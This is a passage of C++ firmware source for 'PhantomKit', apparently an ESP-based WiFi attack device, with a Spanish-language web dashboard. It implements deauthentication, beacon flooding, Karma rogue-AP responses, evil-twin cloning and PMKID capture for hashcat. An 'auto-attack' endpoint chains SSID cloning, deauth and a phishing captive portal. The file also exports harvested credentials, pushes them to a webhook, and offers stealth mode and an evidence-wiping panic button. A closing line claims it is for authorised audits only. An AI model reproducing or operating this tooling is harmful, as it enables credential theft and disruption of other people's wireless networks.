    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Captura WPA2 PMKIDs del primer frame EAPOL (sin cliente requerido). Combinalo con Deauth para forzar reconexion. Exporta en formato hashcat 22000.</p>";
    html += "<div class='fg'><label>BSSID objetivo (vacio = todos)</label><input type='text' id='pmBssid' placeholder='AA:BB:CC:DD:EE:FF (opcional)'></div>";
    html += "<div class='bg'>";
    html += "<button class='bs' id='bPMS' onclick='startPM()'>Iniciar captura</button>";
    html += "<button class='bp' id='bPMP' onclick='stopPM()' style='display:none'>Detener</button>";
    html += "<a id='pmExport' href='/api/pmkid/export' class='bp' style='padding:8px 16px;text-decoration:none;font-size:11px'>&#8595; Exportar .hc22000</a>";
    html += "</div></div>";
    html += "<div class='card f'><h2>PMKIDs capturados</h2><div id='pmList'><p class='e'>Inicia la captura y activa Deauth para forzar reconexiones</p></div></div>";
    html += "<div class='card'><h2>Estado</h2><div class='stats'>";
    html += "<div class='stat'><span class='sv' id='sPMC'>0</span><span class='sl'>PMKIDs</span></div>";
    html += "<div class='stat'><span class='sv' id='sPMS'>Inactivo</span><span class='sl'>Estado</span></div>";
    html += "</div></div></div></div>";

    // Settings tab: Notifications + Stealth Mode + Karma
    html += "<div id='tab-settings' style='display:none'><div class='g'>";
    html += "<div class='card'><h2>&#9760; Karma Attack</h2>";

    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Responde automaticamente a cualquier probe request. El ESP cambia su SSID para coincidir con la red buscada por el dispositivo.</p>";
    html += "<div class='fg'><label>Estado: <span id='karmaLbl'>Inactivo</span></label></div>";
    html += "<div class='bg'><button class='bd' onclick='startKarma()'>Activar Karma</button><button class='bp' onclick='stopKarma()'>Detener</button></div>";
    html += "<p id='karmaSSID' style='font-size:11px;color:#00d4ff;margin-top:8px'></p></div>";
    html += "<div class='card'><h2>&#128680; Emergency Wipe</h2>";
    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Borra TODAS las credenciales y reinicia el dispositivo. Tambien puedes mantener el boton FLASH 3s.</p>";
    html += "<button class='bd' onclick='if(confirm(\"BORRAR TODO?\"))panic()' style='background:#ff1744'>EMERGENCY WIPE</button></div>";
    html += "<div class='card'><h2>Notificaciones (Webhook)</h2>";
    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Recibe capturas en tiempo real via ntfy.sh o webhook HTTP. Requiere uplink WiFi con internet.</p>";
    html += "<div class='fg'><label>URL (ej: ntfy.sh o tu-servidor.com/path)</label><input type='text' id='nURL' placeholder='ntfy.sh' style='width:100%;box-sizing:border-box'></div>";
    html += "<div class='fg'><label>Topico (para ntfy.sh) o dejar vacio para JSON</label><input type='text' id='nTopic' placeholder='mi-phantomkit'></div>";
    html += "<div class='bg'><button class='bs' onclick='saveNotify()'>Guardar</button><button class='bp' onclick='testNotify()'>Probar</button></div>";
    html += "<p id='nStatus' style='font-size:11px;color:#666;margin-top:8px'></p></div>";
    html += "<div class='card'><h2>Stealth Mode</h2>";
    html += "<p style='color:#666;font-size:11px;margin-bottom:12px'>Oculta el SSID de gestion PhantomKit de los escaneos de redes.</p>";
    html += "<div class='fg'><label>Estado: <span id='sthLbl'>" + String(ap.isStealthMode() ? "Activo" : "Inactivo") + "</span></label></div>";
    html += "<div class='bg'><button class='bs' onclick='setStealth(true)'>Activar</button><button class='bp' onclick='setStealth(false)'>Desactivar</button></div></div>";
    html += "</div></div>";

    html += "<div class='card f'><h2>Logs</h2><div id='lc'></div></div>";
    html += "</div>";


    // Inline probe devices update function
    html += "<script>";
    html += FPSTR(DASH_JS);
    html += "\nfunction uP(){fetch('/api/probe/devices').then(function(r){return r.json()}).then(function(d){";
    html += "document.getElementById('sPD').textContent=d.length;";
    html += "if(d.length===0){document.getElementById('pd').innerHTML='<p class=e>Sin dispositivos</p>';return}";
    html += "var h='<table><thead><tr><th>MAC</th><th>Fabricante</th><th>SSIDs buscados</th><th>RSSI</th><th></th></tr></thead><tbody>';";
    html += "for(var i=0;i<d.length;i++){var x=d[i];";
    html += "h+='<tr><td style=color:#00d4ff>'+e(x.mac)+'</td><td style=color:#7b2ff7>'+e(x.vendor)+'</td><td>'+e((x.ssids||[]).join(', '))+'</td><td>'+e(x.rssi)+'dBm</td>'";
    html += "+\"<td><button class='bp' style='font-size:10px;padding:3px 8px' onclick='quickAttack(\\\"\"+j(x.ssids&&x.ssids[0]||'')+\"\\\",\\\"\"+j(x.mac||'')+\"\\\")'>Atacar</button></td></tr>'}";
    html += "h+='</tbody></table>';document.getElementById('pd').innerHTML=h})}";
    // Auto-attack scan
    html += "\nfunction scanAA(){p('/api/deauth','action=scan').then(function(r){return r.text()}).then(function(t){var d=JSON.parse(t);";
    html += "if(!d.length){document.getElementById('aat').innerHTML='<p class=e>Sin redes</p>';return}";
    html += "var h='<table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>dBm</th><th></th></tr></thead><tbody>';";
    html += "for(var i=0;i<d.length;i++){var x=d[i];h+='<tr><td>'+e(x.ssid)+'</td><td style=color:#00d4ff>'+e(x.bssid)+'</td><td>'+e(x.channel)+'</td><td>'+e(x.rssi)+'</td>'";
    html += "+\"<td><button class='bs' style='font-size:10px;padding:3px 8px' onclick='fillAA(\\\"\"+j(x.ssid)+\"\\\",\\\"\"+j(x.bssid)+'\",\"+Number(x.channel)+')>Sel</button></td></tr>'}";
    html += "h+='</tbody></table>';document.getElementById('aat').innerHTML=h})}";
    html += "\nfunction fillAA(s,b,c){document.getElementById('aaSsid').value=s;document.getElementById('aaBssid').value=b;document.getElementById('aaCh').value=c;";
    html += "fetch('/api/autoattack?action=suggest&ssid='+encodeURIComponent(s)).then(function(r){return r.json()}).then(function(d){document.getElementById('aaTplMsg').textContent='Template sugerido: '+d.template_name})}";
    html += "\nfunction startAA(){var s=document.getElementById('aaSsid').value,b=document.getElementById('aaBssid').value,c=document.getElementById('aaCh').value;";
    html += "p('/api/autoattack','action=start&ssid='+encodeURIComponent(s)+'&bssid='+encodeURIComponent(b)+'&channel='+c).then(function(r){return r.json()}).then(function(d){";
    html += "if(d.ok){document.getElementById('bAAS').style.display='none';document.getElementById('bAAP').style.display='';document.getElementById('sAAS').textContent='Activo';document.getElementById('sAAT').textContent=d.template_name}})}";
    html += "\nfunction stopAA(){p('/api/autoattack','action=stop').then(function(){document.getElementById('bAAS').style.display='';document.getElementById('bAAP').style.display='none';document.getElementById('sAAS').textContent='Inactivo'})}";
    html += "\nfunction quickAttack(ssid,mac){showTab(document.querySelector('.tab'),\'autoattack\');document.getElementById('aaSsid').value=ssid;document.getElementById('aaBssid').value=mac}";
    // PMKID
    html += "\nfunction startPM(){var b=document.getElementById('pmBssid').value;p('/api/pmkid','action=start&bssid='+encodeURIComponent(b)).then(function(){document.getElementById('bPMS').style.display='none';document.getElementById('bPMP').style.display='';document.getElementById('sPMS').textContent='Capturando'})}";
    html += "\nfunction stopPM(){p('/api/pmkid','action=stop').then(function(r){return r.json()}).then(function(d){document.getElementById('bPMS').style.display='';document.getElementById('bPMP').style.display='none';document.getElementById('sPMC').textContent=d.count;document.getElementById('sPMS').textContent='Detenido';uPM()})}";
    html += "\nfunction uPM(){fetch('/api/pmkid/results').then(function(r){return r.json()}).then(function(d){document.getElementById('sPMC').textContent=d.length;if(!d.length){document.getElementById('pmList').innerHTML='<p class=e>Sin PMKIDs</p>';return}var h='<table><thead><tr><th>AP MAC</th><th>STA MAC</th><th>Hashcat</th></tr></thead><tbody>';for(var i=0;i<d.length;i++){var x=d[i];h+='<tr><td style=color:#00d4ff>'+e(x.ap)+'</td><td>'+e(x.sta)+'</td><td style=font-size:9px;word-break:break-all>'+e(x.hashcat)+'</td></tr>'}h+='</tbody></table>';document.getElementById('pmList').innerHTML=h})}";
    // Karma
    html += "\nfunction startKarma(){p('/api/karma','action=start').then(function(){document.getElementById('karmaLbl').textContent='ACTIVO';document.getElementById('karmaLbl').style.color='#ff4444'})}";
    html += "\nfunction stopKarma(){p('/api/karma','action=stop').then(function(){document.getElementById('karmaLbl').textContent='Inactivo';document.getElementById('karmaLbl').style.color=''})}";
    // Panic wipe
    html += "\nfunction panic(){fetch('/api/panic',{method:'POST'}).then(function(){document.body.innerHTML='<div style=color:#ff4444;text-align:center;padding:40px>WIPE COMPLETADO</div>'})}";
    // Toast: detect new credentials
    html += "\nvar _prevCreds=0;function chkToast(d){if(d.credentials>_prevCreds&&_prevCreds>0){showToast('Nueva credencial capturada (#'+d.credentials+')')}  _prevCreds=d.credentials}";
    html += "\nfunction showToast(msg){var t=document.createElement('div');t.style='position:fixed;top:16px;right:16px;background:#00d4ff;color:#000;padding:12px 20px;border-radius:8px;font-family:monospace;font-weight:700;z-index:9999;box-shadow:0 4px 20px rgba(0,212,255,.4);animation:slideIn .3s ease';t.textContent=msg;document.body.appendChild(t);setTimeout(function(){t.remove()},5000)}";
    html += "\n/* status poll override to include chkToast and PMKID poll */";
    html += "\nsetInterval(function(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){chkToast(d);document.getElementById('sC').textContent=d.clients;document.getElementById('sR').textContent=d.credentials;document.getElementById('sDF').textContent=d.deauth_frames;document.getElementById('sDS').textContent=d.deauth_active?'Activo':'Inactivo';document.getElementById('sBC').textContent=d.beacon_count;document.getElementById('sBS').textContent=d.beacon_active?'Activo':'Inactivo';document.getElementById('sPC').textContent=d.probe_count;document.getElementById('sPD').textContent=d.probe_devices||0;document.getElementById('sPS').textContent=d.probe_active?'Activo':'Inactivo';document.getElementById('sPMC').textContent=d.pmkid_count||0;document.getElementById('sPMS').textContent=d.pmkid_active?'Capturando':'Inactivo';if(d.karma_active){document.getElementById('karmaLbl').textContent='ACTIVO - '+d.karma_ssid;document.getElementById('karmaLbl').style.color='#ff4444'}else{document.getElementById('karmaLbl').textContent='Inactivo';document.getElementById('karmaLbl').style.color=''}var dot=document.getElementById('sd');var st=document.getElementById('st');if(d.portal_active){dot.style.background='#00ff88';st.textContent='Portal activo'}else{dot.style.background='#ff4444';st.textContent='Inactivo'}})},3000);";
    html += "</script></body></html>";

    server.send(200, "text/html", html);
}

void PhantomWebServer::handleAPIStatus() {
    String j = "{";
    j += "\"portal_active\":" + String(portal.isActive() ? "true" : "false") + ",";
    j += "\"template\":" + String(portal.getCurrentTemplate()) + ",";
    j += "\"template_name\":\"" + jsonEscape(String(TEMPLATE_NAMES[portal.getCurrentTemplate()])) + "\",";
    j += "\"ssid\":\"" + jsonEscape(ap.getSSID()) + "\",";
    j += "\"clients\":" + String(ap.getClientCount()) + ",";
    j += "\"credentials\":" + String(store.getCount()) + ",";
    j += "\"deauth_active\":" + String(deauth.isRunning() ? "true" : "false") + ",";
    j += "\"deauth_frames\":" + String(deauth.getFramesSent()) + ",";
    j += "\"beacon_active\":" + String(beacon.isRunning() ? "true" : "false") + ",";
    j += "\"beacon_count\":" + String(beacon.getBeaconsSent()) + ",";
    j += "\"probe_active\":" + String(probe.isRunning() ? "true" : "false") + ",";
    j += "\"probe_count\":" + String(probe.getProbesCaptured()) + ",";
    j += "\"probe_devices\":" + String(probe.getDeviceCount()) + ",";
    j += "\"karma_active\":" + String(probe.isKarmaActive() ? "true" : "false") + ",";
    j += "\"karma_ssid\":\"" + jsonEscape(probe.getKarmaSSID()) + "\",";
    j += "\"pmkid_count\":" + String(pmkid.getCaptureCount()) + ",";
    j += "\"pmkid_active\":" + String(pmkid.isCapturing() ? "true" : "false") + ",";
    j += "\"eviltwin_active\":" + String(evilTwin.isActive() ? "true" : "false");
    j += "}";
    server.send(200, "application/json", j);
}

void PhantomWebServer::handleAPICredentials() {
    server.send(200, "application/json", store.getCredentialsJSON());
}

void PhantomWebServer::handleAPILog() {
    server.send(200, "text/plain", logBuffer);
}

void PhantomWebServer::handleAPIControl() {
    String a = server.arg("action");
    if (a == "start") { portal.setActive(true); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { portal.setActive(false); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPITemplate() {
    int i = server.arg("index").toInt();
    if (i >= 0 && i < TEMPLATE_COUNT) { portal.setTemplate(i); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPISSID() {
    String s = server.arg("ssid");
    if (s.length() > 0 && s.length() <= 32) { ap.setSSID(s); ap.restartAP(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIClear() { store.clear(); server.send(200, "text/plain", "OK"); }

void PhantomWebServer::handleAPIDeauth() {
    String a = server.arg("action");
    if (a == "start") { deauth.startAttack(server.arg("bssid"), server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { deauth.stopAttack(); server.send(200, "text/plain", "OK"); }
    else if (a == "scan") { deauth.scanAllChannels(); server.send(200, "text/plain", deauth.getTargetsJSON()); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIBeacon() {
    String a = server.arg("action");
    if (a == "start") { beacon.startFlood(server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { beacon.stopFlood(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIProbe() {
    String a = server.arg("action");
    if (a == "start") { probe.startSniffing(server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { probe.stopSniffing(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIEvilTwin() {
    String a = server.arg("action");
    if (a == "scan") { evilTwin.scanAllChannels(); server.send(200, "text/plain", evilTwin.getTargetsJSON()); }
    else if (a == "clone") { evilTwin.cloneTarget(server.arg("ssid"), server.arg("bssid"), server.arg("channel").toInt()); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { evilTwin.stopClone(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIAutoPortal() {
    String a = server.arg("action");
    if (a == "start") { autoPortal.startAutoScan(); server.send(200, "text/plain", "OK"); }
    else if (a == "stop") { autoPortal.stopAutoScan(); server.send(200, "text/plain", "OK"); }
    else { server.send(400, "text/plain", "Error"); }
}

void PhantomWebServer::handleAPIExportCSV() {
#if DASHBOARD_REDACT_CREDENTIALS
    server.send(403, "text/plain", "Export disabled while DASHBOARD_REDACT_CREDENTIALS is enabled");
    return;
#endif
    if (!LittleFS.exists("/credentials.csv")) {
        server.send(404, "text/plain", "Sin credenciales");
        return;
    }
    File f = LittleFS.open("/credentials.csv", "r");
    if (!f) {
        server.send(500, "text/plain", "Error al abrir archivo");
        return;
    }
    server.sendHeader("Content-Disposition", "attachment; filename=\"credentials.csv\"");
    server.sendHeader("Content-Type", "text/csv");
    server.sendHeader("Content-Length", String(f.size()));
    server.streamFile(f, "text/csv");
    f.close();
}

// ---------------------------------------------------------------------------
// handleAPIAutoAttack — chains scan → deauth → portal in one call
// ---------------------------------------------------------------------------
void PhantomWebServer::handleAPIAutoAttack() {
    String action = server.arg("action");
    String bssid  = server.arg("bssid");
    String ssid   = server.arg("ssid");
    int    ch     = server.arg("channel").toInt();

    if (action == "suggest") {
        int tpl = AutoPortalModule::suggestTemplate(ssid);
        String j = "{\"ok\":true,\"template\":" + String(tpl);
        j += ",\"template_name\":\"" + jsonEscape(AutoPortalModule::getTemplateNameFor(ssid)) + "\"}";
        server.send(200, "application/json", j);
        return;
    }
    if (action == "start" && bssid.length() == 17 && ch > 0) {
        // 1. Auto-match template from SSID
        int tpl = AutoPortalModule::suggestTemplate(ssid);
        // 2. Set AP SSID to target SSID
        ap.setSSID(ssid.length() > 0 ? ssid : ap.getSSID());
        ap.restartAP();
        // 3. Start deauth
        deauth.startAttack(bssid, ch);
        // 4. Set template + activate portal
        portal.setTemplate(tpl);
        portal.setActive(true);
        String j = "{\"ok\":true,\"template\":" + String(tpl);
        j += ",\"template_name\":\"" + jsonEscape(AutoPortalModule::getTemplateNameFor(ssid)) + "\"}";
        server.send(200, "application/json", j);
    } else if (action == "stop") {
        deauth.stopAttack();
        portal.setActive(false);
        server.send(200, "application/json", "{\"ok\":true}");
    } else {
        server.send(400, "text/plain", "Parametros invalidos");
    }
}

// ---------------------------------------------------------------------------
// handleAPIKarma — toggle karma mode on probe sniffer
// ---------------------------------------------------------------------------
void PhantomWebServer::handleAPIKarma() {
    String action = server.arg("action");
    if (action == "start") {
        // Ensure probe sniffer is running
        if (!probe.isRunning()) probe.startSniffing(1);
        probe.setKarmaMode(true, karmaCallback);
        server.send(200, "application/json", "{\"ok\":true,\"karma\":true}");
    } else if (action == "stop") {
        probe.setKarmaMode(false);
        server.send(200, "application/json", "{\"ok\":true,\"karma\":false}");
    } else {
        server.send(400, "text/plain", "action requerido: start|stop");
    }
}

// ---------------------------------------------------------------------------
// handleAPIPMKID — start/stop PMKID capture
// ---------------------------------------------------------------------------
void PhantomWebServer::handleAPIPMKID() {
    String action = server.arg("action");
    String bssid  = server.arg("bssid");
    if (action == "start") {
        pmkid.startCapture(bssid);
        server.send(200, "application/json", "{\"ok\":true}");
    } else if (action == "stop") {
        pmkid.stopCapture();
        server.send(200, "application/json",
            String("{\"ok\":true,\"count\":") + pmkid.getCaptureCount() + "}");
    } else {
        server.send(400, "text/plain", "action requerido: start|stop");
    }
}

// ---------------------------------------------------------------------------
// handleAPIPanic — emergency wipe (no auth required)
// ---------------------------------------------------------------------------
void PhantomWebServer::handleAPIPanic() {
    if (!LittleFS.begin()) {
        server.send(500, "text/plain", "LittleFS error");
        return;
    }
    // Clear all sensitive data
    LittleFS.remove("/credentials.csv");
    LittleFS.remove("/notify.cfg");
    server.send(200, "text/plain", "WIPE OK - reiniciando");
    delay(300);
    ESP.restart();
}

void PhantomWebServer::handleAPIExportReport() {
#if DASHBOARD_REDACT_CREDENTIALS
    server.send(403, "text/plain", "Report export disabled while DASHBOARD_REDACT_CREDENTIALS is enabled");
    return;
#endif
    unsigned long uptime = millis() / 1000;
    unsigned long hrs  = uptime / 3600;
    unsigned long mins = (uptime % 3600) / 60;
    unsigned long secs = uptime % 60;

    String report;
    report.reserve(2048);
    report += "========================================\n";
    report += "  PhantomKit - Reporte de Sesion\n";
    report += "========================================\n\n";

    char uptimeBuf[32];
    snprintf(uptimeBuf, sizeof(uptimeBuf), "%02lu:%02lu:%02lu", hrs, mins, secs);
    report += "Duracion de sesion : ";
    report += uptimeBuf;
    report += "\n";
    report += "Credenciales       : ";
    report += String(store.getCount());
    report += "\n";
    report += "Template activo    : ";
    report += String(TEMPLATE_NAMES[portal.getCurrentTemplate()]);
    report += "\n";
    report += "Deauth frames      : ";
    report += String(deauth.getFramesSent());
    report += "\n";
    report += "Beacons enviados   : ";
    report += String(beacon.getBeaconsSent());
    report += "\n";
    report += "Probes capturados  : ";
    report += String(probe.getProbesCaptured());
    report += "\n\n";
    report += "----------------------------------------\n";
    report += "  Credenciales capturadas\n";
    report += "----------------------------------------\n";

    if (LittleFS.exists("/credentials.csv")) {
        File f = LittleFS.open("/credentials.csv", "r");
        if (f) {
            int n = 1;
            while (f.available()) {
                String line = f.readStringUntil('\n');
                line.trim();
                if (line.length() == 0) continue;
                report += "[";
                report += String(n++);
                report += "] ";
                report += line;
                report += "\n";
            }
            f.close();
        }
    } else {
        report += "Sin credenciales en esta sesion.\n";
    }

    report += "\n========================================\n";
    report += "  Generado por PhantomKit v1.2.0\n";
    report += "  Solo para auditorias autorizadas\n";
    report += "========================================\n";

    server.sendHeader("Content-Disposition", "attachment; filename=\"phantomkit_report.txt\"");
    server.send(200, "text/plain", report);
}
